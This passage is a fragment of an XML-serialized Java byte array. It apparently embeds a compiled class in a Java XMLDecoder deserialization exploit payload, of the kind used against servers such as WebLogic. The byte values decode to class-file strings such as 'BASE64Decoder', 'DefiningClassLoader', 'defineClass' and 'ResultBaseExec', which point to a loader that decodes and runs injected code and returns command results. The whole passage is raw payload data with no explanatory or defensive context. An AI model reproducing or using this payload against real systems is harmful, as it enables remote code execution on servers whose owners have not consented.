&lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4145"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4146"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4147"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="4148"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4149"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4150"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4151"&gt; &lt;byte&gt;88&lt;/byte&gt;&lt;/void&gt;&lt;void index="4152"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4153"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4154"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4155"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4156"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4157"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4158"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4159"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4160"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4161"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4162"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4163"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4164"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="4165"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4166"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4167"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="4168"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4169"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4170"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="4171"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4172"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="4173"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4174"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4175"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4176"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4177"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4178"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4179"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4180"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4181"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4182"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4183"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4184"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4185"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4186"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4187"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4188"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4189"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4190"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4191"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4192"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4193"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4194"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="4195"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="4196"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4197"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4198"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4199"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4200"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4201"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4202"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4203"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="4204"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4205"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4206"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4207"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4208"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4209"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4210"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4211"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4212"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4213"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4214"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4215"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4216"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="4217"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4218"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4219"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="4220"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4221"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4222"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4223"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4224"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4225"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4226"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4227"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4228"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4229"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4230"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4231"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4232"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4233"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4234"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4235"&gt; &lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="4236"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4237"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4238"&gt; &lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="4239"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4240"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4241"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4242"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4243"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4244"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4245"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4246"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4247"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4248"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4249"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4250"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4251"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4252"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4253"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4254"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="4255"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4256"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4257"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="4258"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4259"&gt; &lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="4260"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4261"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4262"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4263"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4264"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4265"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4266"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4267"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="4268"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="4270"&gt; &lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="4271"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4273"&gt; &lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="4274"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4275"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4276"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4277"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4278"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4279"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4280"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4281"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4282"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4283"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4284"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4285"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4286"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4287"&gt; &lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="4288"&gt; &lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="4289"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4290"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4291"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4292"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4293"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4294"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4295"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4296"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="4298"&gt; &lt;byte&gt;64&lt;/byte&gt;&lt;/void&gt;&lt;void index="4299"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="4301"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="4303"&gt; &lt;byte&gt;34&lt;/byte&gt;&lt;/void&gt;&lt;void index="4304"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4306"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="4307"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4308"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4309"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4310"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4311"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4312"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4313"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4314"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4315"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4316"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4317"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="4318"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4319"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4320"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4321"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4322"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4323"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4324"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4325"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4326"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4327"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4328"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4329"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4330"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4331"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4332"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="4334"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4335"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4337"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="4338"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4339"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4340"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4341"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4342"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4343"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4344"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4345"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4346"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4347"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4348"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4349"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4350"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4352"&gt; &lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="4353"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="4354"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="4355"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="4356"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4357"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="4358"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4359"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4360"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4361"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4362"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4363"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4364"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4365"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4366"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4367"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4368"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4369"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4370"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4371"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="4372"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="4373"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="4374"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4375"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="4377"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4379"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="4380"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="4382"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4384"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="4385"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4387"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="4388"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4389"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4390"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4391"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4392"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4393"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4394"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="4395"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4396"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4397"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4398"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4399"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4400"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4401"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4402"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4403"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4404"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4405"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4406"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4407"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4408"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4409"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4410"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="4411"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4412"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4413"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4414"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4415"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4416"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4417"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4418"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4419"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4420"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4421"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4422"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4423"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="4424"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4425"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4426"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4427"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4428"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4429"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="4431"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="4432"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="4434"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="4436"&gt; &lt;byte&gt;34&lt;/byte&gt;&lt;/void&gt;&lt;void index="4437"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4439"&gt; &lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="4440"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="4441"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4442"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4443"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4444"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4445"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4446"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="4447"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4448"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4449"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4450"&gt; &lt;byte&gt;69&lt;/byte&gt;&lt;/void&gt;&lt;void index="4451"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="4452"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4453"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4454"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="4456"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="4457"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4459"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="4460"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="4461"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4462"&gt; &lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="4463"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4464"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4465"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4466"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="4467"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4468"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4469"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4470"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4471"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4473"&gt; &lt;byte&gt;39&lt;/byte&gt;&lt;/void&gt;&lt;void index="4474"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="4475"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="4476"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="4477"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4478"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="4479"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4480"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4481"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4482"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4483"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4484"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4485"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4486"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4487"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4488"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4489"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4490"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4491"&gt; 